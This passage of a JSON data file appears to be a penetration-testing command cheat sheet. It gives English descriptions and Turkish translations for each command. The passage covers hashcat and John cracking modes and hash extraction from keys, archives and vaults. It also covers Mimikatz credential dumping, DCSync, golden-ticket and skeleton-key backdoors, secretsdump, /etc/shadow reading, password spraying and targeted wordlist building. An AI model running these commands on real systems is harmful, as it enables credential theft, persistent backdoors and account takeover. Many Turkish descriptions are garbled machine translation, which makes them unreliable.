            "cmd": "hashcat -m 500 hashes.txt /usr/share/wordlists/rockyou.txt",
            "tags": [
              "essential",
              "tool"
            ],
            "desc_tr": "Kır: Linux MD5 crypt ($1$)"
          },
          {
            "title": "Hashcat NTLM",
            "desc": "Crack Windows NTLM hashes",
            "cmd": "hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt",
            "tags": [
              "essential",
              "tool"
            ],
            "desc_tr": "Kır: Windows NTLM hashes"
          },
          {
            "title": "Hashcat SHA256",
            "desc": "Crack SHA256 hashes",
            "cmd": "hashcat -m 1400 hashes.txt /usr/share/wordlists/rockyou.txt",
            "tags": [
              "essential",
              "tool"
            ],
            "desc_tr": "Kır: SHA256 hashes"
          },
          {
            "title": "Hashcat SHA512",
            "desc": "Crack SHA512 hashes",
            "cmd": "hashcat -m 1700 hashes.txt /usr/share/wordlists/rockyou.txt",
            "tags": [
              "tool"
            ],
            "desc_tr": "Kır: SHA512 hashes"
          },
          {
            "title": "Hashcat SHA512Crypt",
            "desc": "Crack Linux SHA512 crypt ($6$)",
            "cmd": "hashcat -m 1800 hashes.txt /usr/share/wordlists/rockyou.txt",
            "tags": [
              "essential",
              "tool"
            ],
            "desc_tr": "Kır: Linux SHA512 crypt ($6$)"
          },
          {
            "title": "Hashcat bcrypt",
            "desc": "Crack bcrypt hashes",
            "cmd": "hashcat -m 3200 hashes.txt /usr/share/wordlists/rockyou.txt",
            "tags": [
              "tool"
            ],
            "desc_tr": "Kır: bcrypt hashes"
          },
          {
            "title": "Hashcat NetNTLMv2",
            "desc": "Crack NetNTLMv2 hashes (Responder captures)",
            "cmd": "hashcat -m 5600 hashes.txt /usr/share/wordlists/rockyou.txt",
            "tags": [
              "essential",
              "tool"
            ],
            "desc_tr": "Kır: NetNTLMv2 hashes (Responder captures)"
          },
          {
            "title": "Hashcat NetNTLMv1",
            "desc": "Crack NetNTLMv1 hashes",
            "cmd": "hashcat -m 5500 hashes.txt /usr/share/wordlists/rockyou.txt",
            "tags": [
              "tool"
            ],
            "desc_tr": "Kır: NetNTLMv1 hashes"
          },
          {
            "title": "Hashcat Kerberoast (TGS-REP)",
            "desc": "Crack Kerberoasted service ticket hashes",
            "cmd": "hashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt",
            "tags": [
              "essential",
              "tool"
            ],
            "desc_tr": "Kır: Kerberoasted service ticket hashes"
          },
          {
            "title": "Hashcat AS-REP Roast",
            "desc": "Crack AS-REP roasted hashes",
            "cmd": "hashcat -m 18200 hashes.txt /usr/share/wordlists/rockyou.txt",
            "tags": [
              "essential",
              "tool"
            ],
            "desc_tr": "Kır: AS-REP roasted hashes"
          },
          {
            "title": "Hashcat WPA2",
            "desc": "Crack WPA2 handshake",
            "cmd": "hashcat -m 2500 capture.hccapx /usr/share/wordlists/rockyou.txt",
            "tags": [
              "tool"
            ],
            "desc_tr": "Kır: WPA2 handshake"
          },
          {
            "title": "Hashcat Kerberos 5 TGS-REP RC4",
            "desc": "Crack Kerberos 5 etype 23",
            "cmd": "hashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt",
            "tags": [
              "tool"
            ],
            "desc_tr": "Kır: Kerberos 5 etype 23"
          },
          {
            "title": "Hashcat Kerberos 5 TGS-REP AES256",
            "desc": "Crack Kerberos 5 etype 18",
            "cmd": "hashcat -m 19700 hashes.txt /usr/share/wordlists/rockyou.txt",
            "tags": [
              "advanced"
            ],
            "desc_tr": "Kır: Kerberos 5 etype 18"
          },
          {
            "title": "Hashcat MD4 (NTLM raw)",
            "desc": "Crack raw MD4/NTLM",
            "cmd": "hashcat -m 900 hashes.txt /usr/share/wordlists/rockyou.txt",
            "tags": [
              "tool"
            ],
            "desc_tr": "Kır: raw MD4/NTLM"
          },
          {
            "title": "Hashcat with Rules",
            "desc": "Crack using rule-based transformations",
            "cmd": "hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule",
            "tags": [
              "essential",
              "tool"
            ],
            "desc_tr": "Kır: rule-based transformations kullanarak"
          },
          {
            "title": "Hashcat OneRuleToRuleThemAll",
            "desc": "Crack with the most comprehensive rule",
            "cmd": "hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/OneRuleToRuleThemAll.rule",
            "tags": [
              "tool"
            ],
            "desc_tr": "Kır: the most comprehensive rule ile"
          },
          {
            "title": "Hashcat Mask Attack",
            "desc": "Brute force with pattern mask",
            "cmd": "hashcat -m 1000 hashes.txt -a 3 '?u?l?l?l?l?d?d?d'",
            "tags": [
              "essential",
              "tool"
            ],
            "note": "?u=upper ?l=lower ?d=digit ?s=special ?a=all",
            "desc_tr": "Kaba kuvvet: kuvvet saldırısı pattern mask ile"
          },
          {
            "title": "Hashcat Combinator Attack",
            "desc": "Combine two wordlists",
            "cmd": "hashcat -m 1000 hashes.txt -a 1 wordlist1.txt wordlist2.txt",
            "tags": [
              "tool"
            ],
            "desc_tr": "Combine two wordlists"
          },
          {
            "title": "Hashcat Show Cracked",
            "desc": "Display previously cracked hashes",
            "cmd": "hashcat -m 1000 hashes.txt --show",
            "tags": [
              "essential",
              "tool"
            ],
            "desc_tr": "Display previously cracked hashes"
          },
          {
            "title": "Hashcat Mask Attack (Custom)",
            "desc": "Brute force with custom mask charset",
            "cmd": "hashcat -m 1000 hashes.txt -a 3 -1 '?u?l' -2 '?d?s' '?1?1?1?1?2?2?2?2'",
            "tags": [
              "advanced",
              "tool"
            ],
            "note": "-1 defines custom charset 1, -2 defines charset 2",
            "desc_tr": "Kaba kuvvet: kuvvet saldırısı özel mask charset ile"
          },
          {
            "title": "Hashcat Hybrid Wordlist+Mask",
            "desc": "Append mask pattern to wordlist entries",
            "cmd": "hashcat -m 1000 hashes.txt -a 6 /usr/share/wordlists/rockyou.txt '?d?d?d?d'",
            "tags": [
              "tool"
            ],
            "note": "Mode 6: wordlist+mask, Mode 7: mask+wordlist",
            "desc_tr": "Append mask pattern kelime listesi entries'e"
          },
          {
            "title": "Hashcat Hybrid Mask+Wordlist",
            "desc": "Prepend mask pattern to wordlist entries",
            "cmd": "hashcat -m 1000 hashes.txt -a 7 '?d?d?d?d' /usr/share/wordlists/rockyou.txt",
            "tags": [
              "tool"
            ],
            "desc_tr": "Prepend mask pattern kelime listesi entries'e"
          },
          {
            "title": "Hashcat PRINCE Attack",
            "desc": "Generate word combinations from wordlist",
            "cmd": "hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --prince",
            "tags": [
              "advanced",
              "tool"
            ],
            "note": "PRINCE combines words from the wordlist in various ways",
            "desc_tr": "Oluştur: word combinations kelime listesi üzerinden"
          },
          {
            "title": "Hashcat DES Crypt",
            "desc": "Crack DES crypt hashes",
            "cmd": "hashcat -m 1500 hashes.txt /usr/share/wordlists/rockyou.txt",
            "tags": [
              "tool"
            ],
            "desc_tr": "Kır: DES crypt hashes"
          },
          {
            "title": "Hashcat MSSQL (2012+)",
            "desc": "Crack MSSQL 2012/2014 hashes",
            "cmd": "hashcat -m 1731 hashes.txt /usr/share/wordlists/rockyou.txt",
            "tags": [
              "tool"
            ],
            "desc_tr": "Kır: MSSQL 2012/2014 hashes"
          },
          {
            "title": "Hashcat MySQL 4.1+",
            "desc": "Crack MySQL SHA1 hashes",
            "cmd": "hashcat -m 300 hashes.txt /usr/share/wordlists/rockyou.txt",
            "tags": [
              "tool"
            ],
            "desc_tr": "Kır: MySQL SHA1 hashes"
          },
          {
            "title": "Hashcat PostgreSQL MD5",
            "desc": "Crack PostgreSQL MD5 hashes",
            "cmd": "hashcat -m 12 hashes.txt /usr/share/wordlists/rockyou.txt",
            "tags": [
              "tool"
            ],
            "desc_tr": "Kır: PostgreSQL MD5 hashes"
          },
          {
            "title": "Hashcat scrypt",
            "desc": "Crack scrypt hashes",
            "cmd": "hashcat -m 8900 hashes.txt /usr/share/wordlists/rockyou.txt",
            "tags": [
              "advanced",
              "tool"
            ],
            "desc_tr": "Kır: scrypt hashes"
          },
          {
            "title": "Hashcat DPAPI Master Key",
            "desc": "Crack DPAPI master key files",
            "cmd": "hashcat -m 15300 dpapi_hash.txt /usr/share/wordlists/rockyou.txt",
            "tags": [
              "advanced",
              "tool"
            ],
            "desc_tr": "Kır: DPAPI master key files"
          },
          {
            "title": "Hashcat Increment Mode",
            "desc": "Try all lengths from min to max",
            "cmd": "hashcat -m 1000 hashes.txt -a 3 '?a?a?a?a?a?a?a?a' --increment --increment-min=4 --increment-max=8",
            "tags": [
              "tool"
            ],
            "desc_tr": "Try tüm lengths mmax üzerinden'e içinde"
          },
          {
            "title": "Hashcat Hybrid",
            "desc": "Wordlist + mask append",
            "cmd": "hashcat -m <HASH_TYPE> hashes.txt -a 6 /usr/share/wordlists/rockyou.txt ?d?d?d?d",
            "tags": [
              "tool"
            ],
            "desc_tr": "kelime listesi + mask append"
          },
          {
            "title": "Hashcat Combinator",
            "desc": "Combine two wordlists",
            "cmd": "hashcat -m <HASH_TYPE> hashes.txt -a 1 wordlist1.txt wordlist2.txt",
            "tags": [
              "tool"
            ],
            "desc_tr": "Combine two wordlists"
          },
          {
            "title": "Hashcat Optimized",
            "desc": "Use optimized kernel",
            "cmd": "hashcat -m <HASH_TYPE> hashes.txt /usr/share/wordlists/rockyou.txt -O",
            "tags": [
              "essential"
            ],
            "desc_tr": "Use optimized kernel"
          }
        ],
        "name_tr": "Offline Cracking (Hashcat)"
      },
      {
        "name": "Offline Cracking (John)",
        "commands": [
          {
            "title": "John Basic Crack",
            "desc": "Crack hashes with default wordlist",
            "cmd": "john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt",
            "tags": [
              "essential",
              "tool"
            ],
            "desc_tr": "Kır: hashes default kelime listesi ile"
          },
          {
            "title": "John with Format",
            "desc": "Crack with specified hash format",
            "cmd": "john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=Raw-MD5",
            "tags": [
              "essential",
              "tool"
            ],
            "desc_tr": "Kır: specified hash format ile"
          },
          {
            "title": "John NTLM",
            "desc": "Crack NTLM hashes",
            "cmd": "john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=NT",
            "tags": [
              "essential",
              "tool"
            ],
            "desc_tr": "Kır: NTLM hashes"
          },
          {
            "title": "John Show Cracked",
            "desc": "Display cracked passwords",
            "cmd": "john hashes.txt --show",
            "tags": [
              "essential",
              "tool"
            ],
            "desc_tr": "Display cracked passwords"
          },
          {
            "title": "John with Rules",
            "desc": "Crack with mangling rules",
            "cmd": "john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt --rules=best64",
            "tags": [
              "tool"
            ],
            "desc_tr": "Kır: mangling rules ile"
          },
          {
            "title": "ssh2john Extract Hash",
            "desc": "Extract hash from SSH private key",
            "cmd": "ssh2john id_rsa > ssh_hash.txt",
            "tags": [
              "essential",
              "tool"
            ],
            "desc_tr": "Çıkart: hash SSH özel anahtar üzerinden"
          },
          {
            "title": "zip2john Extract Hash",
            "desc": "Extract hash from password-protected ZIP",
            "cmd": "zip2john protected.zip > zip_hash.txt",
            "tags": [
              "essential",
              "tool"
            ],
            "desc_tr": "Çıkart: hash password-protected ZIP üzerinden"
          },
          {
            "title": "zip2john + John Full Workflow",
            "desc": "Extract ZIP hash and crack with rockyou — complete workflow",
            "cmds": [
              "zip2john protected.zip > zip_hash.txt",
              "john zip_hash.txt --wordlist=/usr/share/wordlists/rockyou.txt",
              "john zip_hash.txt --show"
            ],
            "tags": [
              "essential",
              "tool"
            ],
            "note": "john --show displays cracked passwords after the run",
            "desc_tr": "Çıkart: ZIP hash and crack rockyou — complete workflow ile"
          },
          {
            "title": "ssh2john Extract SSH Key Hash",
            "desc": "Extract hash from passphrase-protected SSH private key",
            "cmd": "ssh2john id_rsa > ssh_hash.txt",
            "tags": [
              "essential",
              "tool"
            ],
            "desc_tr": "Çıkart: hash passphrase-protected SSH özel anahtar üzerinden"
          },
          {
            "title": "ssh2john + John Full Workflow",
            "desc": "Crack SSH key passphrase with john",
            "cmds": [
              "ssh2john id_rsa > ssh_hash.txt",
              "john ssh_hash.txt --wordlist=/usr/share/wordlists/rockyou.txt",
              "john ssh_hash.txt --show"
            ],
            "tags": [
              "essential",
              "tool"
            ],
            "desc_tr": "Kır: SSH key passphrase john ile"
          },
          {
            "title": "rar2john Extract Hash",
            "desc": "Extract hash from RAR archive",
            "cmd": "rar2john protected.rar > rar_hash.txt",
            "tags": [
              "tool"
            ],
            "desc_tr": "Çıkart: hash RAR archive üzerinden"
          },
          {
            "title": "keepass2john Extract Hash",
            "desc": "Extract hash from KeePass database",
            "cmd": "keepass2john database.kdbx > keepass_hash.txt",
            "tags": [
              "essential",
              "tool"
            ],
            "desc_tr": "Çıkart: hash KeePass database üzerinden"
          },
          {
            "title": "office2john Extract Hash",
            "desc": "Extract hash from Office document",
            "cmd": "office2john protected.docx > office_hash.txt",
            "tags": [
              "tool"
            ],
            "desc_tr": "Çıkart: hash Office document üzerinden"
          },
          {
            "title": "pdf2john Extract Hash",
            "desc": "Extract hash from password-protected PDF",
            "cmd": "pdf2john protected.pdf > pdf_hash.txt",
            "tags": [
              "tool"
            ],
            "desc_tr": "Çıkart: hash password-protected PDF üzerinden"
          },
          {
            "title": "7z2john Extract Hash",
            "desc": "Extract hash from 7-Zip archive",
            "cmd": "7z2john protected.7z > 7z_hash.txt",
            "tags": [
              "tool"
            ],
            "desc_tr": "Çıkart: hash 7-Zip archive üzerinden"
          },
          {
            "title": "gpg2john Extract Hash",
            "desc": "Extract hash from GPG key",
            "cmd": "gpg2john private.key > gpg_hash.txt",
            "tags": [
              "tool"
            ],
            "desc_tr": "Çıkart: hash GPG key üzerinden"
          },
          {
            "title": "bitlocker2john Extract Hash",
            "desc": "Extract hash from BitLocker volume",
            "cmd": "bitlocker2john -i bitlocker_volume > bl_hash.txt",
            "tags": [
              "tool"
            ],
            "desc_tr": "Çıkart: hash BitLocker volume üzerinden"
          },
          {
            "title": "ansible2john Extract Hash",
            "desc": "Extract hash from Ansible vault",
            "cmd": "ansible2john vault.yml > ansible_hash.txt",
            "tags": [
              "tool"
            ],
            "desc_tr": "Çıkart: hash Ansible vault üzerinden"
          },
          {
            "title": "krb5tgs2john Extract Hash",
            "desc": "Extract Kerberos TGS ticket hash",
            "cmd": "kirbi2john ticket.kirbi > krb_hash.txt",
            "tags": [
              "tool"
            ],
            "desc_tr": "Çıkart: Kerberos TGS ticket hash"
          },
          {
            "title": "John SHA512Crypt Format",
            "desc": "Crack Linux SHA512 crypt hashes",
            "cmd": "john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=sha512crypt",
            "tags": [
              "tool"
            ],
            "desc_tr": "Kır: Linux SHA512 crypt hashes"
          },
          {
            "title": "John bcrypt Format",
            "desc": "Crack bcrypt hashes",
            "cmd": "john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=bcrypt",
            "tags": [
              "tool"
            ],
            "desc_tr": "Kır: bcrypt hashes"
          },
          {
            "title": "John Kerberos TGS",
            "desc": "Crack Kerberoasted TGS hashes",
            "cmd": "john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=krb5tgs",
            "tags": [
              "essential",
              "tool"
            ],
            "desc_tr": "Kır: Kerberoasted TGS hashes"
          },
          {
            "title": "John AS-REP Hash",
            "desc": "Crack AS-REP roasted hashes",
            "cmd": "john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=krb5asrep",
            "tags": [
              "essential",
              "tool"
            ],
            "desc_tr": "Kır: AS-REP roasted hashes"
          },
          {
            "title": "John NetNTLMv2",
            "desc": "Crack NetNTLMv2 hashes captured by Responder",
            "cmd": "john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=netntlmv2",
            "tags": [
              "essential",
              "tool"
            ],
            "desc_tr": "Kır: NetNTLMv2 hashes captured by Responder"
          },
          {
            "title": "John MSSQL Hash",
            "desc": "Crack MSSQL password hashes",
            "cmd": "john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=mssql12",
            "tags": [
              "tool"
            ],
            "desc_tr": "Kır: MSSQL password hashes"
          },
          {
            "title": "John MySQL Hash",
            "desc": "Crack MySQL password hashes",
            "cmd": "john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=mysql-sha1",
            "tags": [
              "tool"
            ],
            "desc_tr": "Kır: MySQL password hashes"
          },
          {
            "title": "John List Formats",
            "desc": "List all supported hash formats",
            "cmd": "john --list=formats | tr ',' '\\n'",
            "tags": [
              "essential",
              "tool"
            ],
            "desc_tr": "Listele: tüm supported hash formats"
          },
          {
            "title": "John Incremental Mode",
            "desc": "Pure brute force with john",
            "cmd": "john hashes.txt --incremental=Alnum --max-length=8",
            "tags": [
              "tool"
            ],
            "desc_tr": "Pure kaba kuvvet saldırısı john ile"
          },
          {
            "title": "wpa2john Extract Hash",
            "desc": "Extract hash from WPA handshake pcap",
            "cmd": "wpa2john capture.pcap > wpa_hash.txt",
            "tags": [
              "tool"
            ],
            "desc_tr": "Çıkart: hash WPA handshake pcap üzerinden"
          },
          {
            "title": "vncpasswd Decrypt",
            "desc": "Decrypt VNC stored password file",
            "cmd": "vncpwd /path/to/.vnc/passwd",
            "tags": [
              "tool"
            ],
            "note": "Or use: echo '<HEX_PASS>' | xxd -r -p | openssl enc -des-cbc -nopad -nosalt -K e84ad660c4721ae0 -iv 0000000000000000 -d",
            "desc_tr": "Şifreyi çöz: VNC stored password file"
          }
        ],
        "name_tr": "Offline Cracking (John)"
      },
      {
        "name": "Hash Extraction & Identification",
        "commands": [
          {
            "title": "Hash Identifier",
            "desc": "Identify hash type with hash-identifier",
            "cmd": "hash-identifier",
            "tags": [
              "essential",
              "tool"
            ],
            "desc_tr": "Tespit et: hash type hash-identifier ile"
          },
          {
            "title": "Hashid Identification",
            "desc": "Identify hash type with hashid",
            "cmd": "hashid '<HASH>'",
            "tags": [
              "essential",
              "tool"
            ],
            "desc_tr": "Tespit et: hash type hashid ile"
          },
          {
            "title": "Name That Hash",
            "desc": "Identify hash with recommended hashcat/john mode",
            "cmd": "nth --text '<HASH>'",
            "tags": [
              "essential",
              "tool"
            ],
            "desc_tr": "Tespit et: hash recommended hashcat/john mode ile"
          },
          {
            "title": "Name That Hash from File",
            "desc": "Identify hashes from a file",
            "cmd": "nth --file hashes.txt",
            "tags": [
              "tool"
            ],
            "desc_tr": "Tespit et: hashes a file üzerinden"
          }
        ],
        "name_tr": "Hash Extraction & Identification"
      },
      {
        "name": "Credential Dumping (Windows)",
        "commands": [
          {
            "title": "Mimikatz Logon Passwords",
            "desc": "Dump plaintext passwords from memory",
            "cmd": "mimikatz.exe \"privilege::debug\" \"sekurlsa::logonpasswords\" \"exit\"",
            "tags": [
              "essential",
              "tool"
            ],
            "desc_tr": "Dökümle: plaintext passwords memory üzerinden"
          },
          {
            "title": "Mimikatz SAM Dump",
            "desc": "Dump SAM database hashes",
            "cmd": "mimikatz.exe \"privilege::debug\" \"lsadump::sam\" \"exit\"",
            "tags": [
              "essential",
              "tool"
            ],
            "desc_tr": "Dökümle: SAM database hashes"
          },
          {
            "title": "Mimikatz DCSync",
            "desc": "Replicate AD to extract all hashes",
            "cmd": "mimikatz.exe \"privilege::debug\" \"lsadump::dcsync /domain:<DOMAIN> /all\" \"exit\"",
            "tags": [
              "essential",
              "tool"
            ],
            "desc_tr": "Replicate AD extract tüm hashes'e"
          },
          {
            "title": "Mimikatz DCSync Specific User",
            "desc": "DCSync a specific user's hash",
            "cmd": "mimikatz.exe \"privilege::debug\" \"lsadump::dcsync /domain:<DOMAIN> /user:Administrator\" \"exit\"",
            "tags": [
              "essential",
              "tool"
            ],
            "desc_tr": "DCSync a belirli user's hash"
          },
          {
            "title": "Mimikatz Pass the Hash",
            "desc": "Perform Pass-the-Hash attack",
            "cmd": "mimikatz.exe \"privilege::debug\" \"sekurlsa::pth /user:<USER> /domain:<DOMAIN> /ntlm:<NTLM_HASH>\" \"exit\"",
            "tags": [
              "essential",
              "tool"
            ],
            "desc_tr": "Perform Pass-the-Hash attack"
          },
          {
            "title": "Mimikatz Kerberos Tickets",
            "desc": "Export Kerberos tickets from memory",
            "cmd": "mimikatz.exe \"privilege::debug\" \"sekurlsa::tickets /export\" \"exit\"",
            "tags": [
              "tool"
            ],
            "desc_tr": "Dışa aktar: Kerberos tickets memory üzerinden"
          },
          {
            "title": "Mimikatz Golden Ticket",
            "desc": "Create a Golden Ticket",
            "cmd": "mimikatz.exe \"kerberos::golden /user:Administrator /domain:<DOMAIN> /sid:<DOMAIN_SID> /krbtgt:<KRBTGT_HASH> /ptt\" \"exit\"",
            "tags": [
              "advanced",
              "tool"
            ],
            "desc_tr": "Oluştur: a Golden Ticket"
          },
          {
            "title": "Mimikatz DPAPI Vault",
            "desc": "Decrypt DPAPI-protected credentials",
            "cmd": "mimikatz.exe \"privilege::debug\" \"vault::cred\" \"exit\"",
            "tags": [
              "advanced",
              "tool"
            ],
            "desc_tr": "Şifreyi çöz: DPAPI-protected kimlik bilgileri"
          },
          {
            "title": "Secretsdump Remote",
            "desc": "Dump secrets from remote host (Impacket)",
            "cmd": "secretsdump.py <DOMAIN>/<USER>:<PASS>@<TARGET_IP>",
            "tags": [
              "essential",
              "tool"
            ],
            "desc_tr": "Dökümle: secrets uzak host (Impacket) üzerinden"
          },
          {
            "title": "Secretsdump with Hash",
            "desc": "Dump secrets using NTLM hash (PtH)",
            "cmd": "secretsdump.py <DOMAIN>/<USER>@<TARGET_IP> -hashes :<NTLM_HASH>",
            "tags": [
              "essential",
              "tool"
            ],
            "desc_tr": "Dökümle: secrets NTLM hash (PtH) kullanarak"
          },
          {
            "title": "Secretsdump Local SAM",
            "desc": "Extract hashes from local SAM/SYSTEM files",
            "cmd": "secretsdump.py -sam SAM -system SYSTEM LOCAL",
            "tags": [
              "essential",
              "tool"
            ],
            "desc_tr": "Çıkart: hashes yerel SAM/SYSTEM files üzerinden"
          },
          {
            "title": "Pypykatz Live Dump",
            "desc": "Python mimikatz — dump from live LSASS",
            "cmd": "pypykatz live lsa",
            "tags": [
              "tool"
            ],
            "desc_tr": "Pythmimikatz — dump live LSASS üzerinden üzerinde"
          },
          {
            "title": "Pypykatz from Dump",
            "desc": "Parse LSASS dump file",
            "cmd": "pypykatz lsa minidump lsass.dmp",
            "tags": [
              "tool"
            ],
            "desc_tr": "Parse LSASS dump file"
          },
          {
            "title": "LaZagne All Modules",
            "desc": "Extract credentials from various applications",
            "cmd": "lazagne.exe all",
            "tags": [
              "tool"
            ],
            "desc_tr": "Çıkart: kimlik bilgileri various applications üzerinden"
          },
          {
            "title": "Mimikatz DPAPI",
            "desc": "Decrypt DPAPI creds",
            "cmd": "mimikatz.exe \"privilege::debug\" \"dpapi::cred /in:C:\\Users\\<USER>\\AppData\\Local\\Microsoft\\Credentials\\<CRED>\" \"exit\"",
            "tags": [
              "advanced"
            ],
            "desc_tr": "Şifreyi çöz: DPAPI creds"
          },
          {
            "title": "Mimikatz Vault",
            "desc": "Dump Vault creds",
            "cmd": "mimikatz.exe \"privilege::debug\" \"vault::cred /patch\" \"exit\"",
            "tags": [
              "tool"
            ],
            "desc_tr": "Dökümle: Vault creds"
          },
          {
            "title": "Mimikatz Skeleton Key",
            "desc": "Install backdoor key",
            "cmd": "mimikatz.exe \"privilege::debug\" \"misc::skeleton\" \"exit\"",
            "tags": [
              "advanced"
            ],
            "note": "All accounts accept 'mimikatz' as password",
            "desc_tr": "Kur: backdoor key"
          },
          {
            "title": "Pypykatz Minidump",
            "desc": "Parse LSASS offline",
            "cmd": "pypykatz lsa minidump lsass.dmp",
            "tags": [
              "essential"
            ],
            "desc_tr": "Parse LSASS offline"
          },
          {
            "title": "LaZagne All",
            "desc": "Extract all stored passwords",
            "cmd": "lazagne.exe all",
            "tags": [
              "essential"
            ],
            "desc_tr": "Çıkart: tüm stored passwords"
          },
          {
            "title": "Password Policy",
            "desc": "Check domain policy",
            "cmds": [
              "net accounts",
              "net accounts /domain",
              "Get-ADDefaultDomainPasswordPolicy"
            ],
            "tags": [
              "essential"
            ],
            "desc_tr": "Kontrol et: domapolicy içinde"
          }
        ],
        "name_tr": "Credential Dumping (Windows)"
      },
      {
        "name": "Credential Dumping (Linux)",
        "commands": [
          {
            "title": "Shadow File Extract",
            "desc": "Read password hashes from shadow file",
            "cmd": "cat /etc/shadow",
            "tags": [
              "essential"
            ],
            "note": "Requires root or shadow group",
            "desc_tr": "Oku: password hashes shadow file üzerinden"
          },
          {
            "title": "Unshadow for John",
            "desc": "Combine passwd and shadow for cracking",
            "cmd": "unshadow /etc/passwd /etc/shadow > unshadowed.txt",
            "tags": [
              "essential"
            ],
            "desc_tr": "Combine passwd and shadow for cracking"
          },
          {
            "title": "LaZagne Linux",
            "desc": "Extract stored credentials on Linux",
            "cmd": "python3 lazagne.py all",
            "tags": [
              "tool"
            ],
            "desc_tr": "Çıkart: stored kimlik bilgileri Linux üzerinde"
          },
          {
            "title": "Search for Password Files",
            "desc": "Find files containing passwords",
            "cmd": "grep -rli 'password\\|passwd\\|pass\\|pwd' /etc/ /opt/ /var/ /home/ 2>/dev/null",
            "tags": [
              "essential"
            ],
            "desc_tr": "Bul: files containing passwords"
          },
          {
            "title": "Check SSH Keys",
            "desc": "Find readable SSH private keys",
            "cmd": "find / -name 'id_rsa' -o -name 'id_ecdsa' -o -name 'id_ed25519' 2>/dev/null | xargs ls -la",
            "tags": [
              "essential"
            ],
            "desc_tr": "Bul: readable SSH private keys"
          },
          {
            "title": "Check Cached Credentials",
            "desc": "Look for cached/stored credentials",
            "cmds": [
              "cat ~/.bashrc | grep -i pass",
              "cat ~/.profile | grep -i pass",
              "find / -name '*.config' -exec grep -li 'password' {} \\; 2>/dev/null"
            ],
            "tags": [
              "essential"
            ],
            "desc_tr": "Look for cached/stored kimlik bilgileri"
          }
        ],
        "name_tr": "Credential Dumping (Linux)"
      },
      {
        "name": "Password Spraying",
        "commands": [
          {
            "title": "CrackMapExec Password Spray SMB",
            "desc": "Spray password across SMB accounts",
            "cmd": "crackmapexec smb <TARGET_IP> -u users.txt -p '<PASS>' --continue-on-success",
            "tags": [
              "essential",
              "tool"
            ],
            "desc_tr": "Püskürt: password SMB accounts genelinde"
          },
          {
            "title": "CrackMapExec Spray Multiple Passwords",
            "desc": "Spray multiple passwords against users",
            "cmd": "crackmapexec smb <TARGET_IP> -u users.txt -p passwords.txt --continue-on-success --no-bruteforce",
            "tags": [
              "tool"
            ],
            "desc_tr": "Püskürt: multiple passwords users'e karşı"
          },
          {
            "title": "Kerbrute User Enumeration",
            "desc": "Enumerate valid AD users via Kerberos",
            "cmd": "kerbrute userenum -d <DOMAIN> --dc <TARGET_IP> users.txt",
            "tags": [
              "essential",
              "tool"
            ],
            "desc_tr": "Listele: valid AD users Kerberos üzerinden"
          },
          {
            "title": "Kerbrute Password Spray",
            "desc": "Spray a password via Kerberos pre-auth",
            "cmd": "kerbrute passwordspray -d <DOMAIN> --dc <TARGET_IP> users.txt '<PASS>'",
            "tags": [
              "essential",
              "tool"
            ],
            "desc_tr": "Püskürt: a password Kerberos pre-auth üzerinden"
          },
          {
            "title": "Spray with Hydra",
            "desc": "Password spray via Hydra with single password",
            "cmd": "hydra -L users.txt -p '<PASS>' <TARGET_IP> smb -t 1",
            "tags": [
              "tool"
            ],
            "desc_tr": "parola püskürtme Hydra single password üzerinden ile"
          }
        ],
        "name_tr": "Password Spraying"
      },
      {
        "name": "Wordlist Engineering",
        "commands": [
          {
            "title": "CeWL Wordlist Generation",
            "desc": "Generate wordlist by spidering target website",
            "cmd": "cewl http://<TARGET_IP> -d 3 -m 5 -w cewl_wordlist.txt",
            "tags": [
              "essential",
              "tool"
            ],
            "desc_tr": "Oluştur: kelime listesi by spidering target website"
          },
          {
            "title": "CeWL with Emails",
            "desc": "Generate wordlist and extract email addresses",
            "cmd": "cewl http://<TARGET_IP> -d 3 -m 5 -w cewl_wordlist.txt -e --email_file emails.txt",
            "tags": [
              "tool"
            ],
            "desc_tr": "Oluştur: kelime listesi and extract email addresses"
          },
          {
            "title": "Crunch Wordlist Generator",
            "desc": "Generate custom wordlist with pattern",
            "cmd": "crunch 8 8 -t @@@@%%%% -o wordlist.txt",
            "tags": [
              "tool"
            ],
            "note": "@=lower %%=digit ^=special ,=upper",
            "desc_tr": "Oluştur: özel kelime listesi pattern ile"
          },
          {
            "title": "Crunch with Charset",
            "desc": "Generate wordlist with custom character set",
            "cmd": "crunch 6 8 abcdef123456 -o wordlist.txt",
            "tags": [
              "tool"
            ],
            "desc_tr": "Oluştur: kelime listesi özel character set ile"
          },
          {
            "title": "CUPP Interactive Profiling",
            "desc": "Generate targeted wordlist from personal info",
            "cmd": "cupp -i",
            "tags": [
              "tool"
            ],
            "desc_tr": "Oluştur: targeted kelime listesi personal info üzerinden"
          },
          {
            "title": "Username Anarchy",
            "desc": "Generate username permutations from names",
            "cmd": "username-anarchy --input-file names.txt --select-format first,flast,first.last > usernames.txt",
            "tags": [
              "tool"
            ],
            "desc_tr": "Oluştur: username permutations names üzerinden"
          },
          {
            "title": "Kwprocessor Keyboard Walks",
            "desc": "Generate keyboard walk patterns",
            "cmd": "kwp basechars/full.base keymaps/en-us.keymap routes/2-to-16-max-3-direction-changes.route > kwp_wordlist.txt",
            "tags": [
              "advanced",
              "tool"
            ],
            "desc_tr": "Oluştur: keyboard walk patterns"
          },
          {
            "title": "Mentalist GUI Wordlist",
            "desc": "GUI-based wordlist generator with rules",
            "cmd": "mentalist",
            "tags": [
              "tool"
            ],
            "note": "GUI tool for creating complex wordlist generation chains",
            "desc_tr": "GUI-based kelime listesi generator rules ile"
          }
        ],
        "name_tr": "Wordlist Engineering"
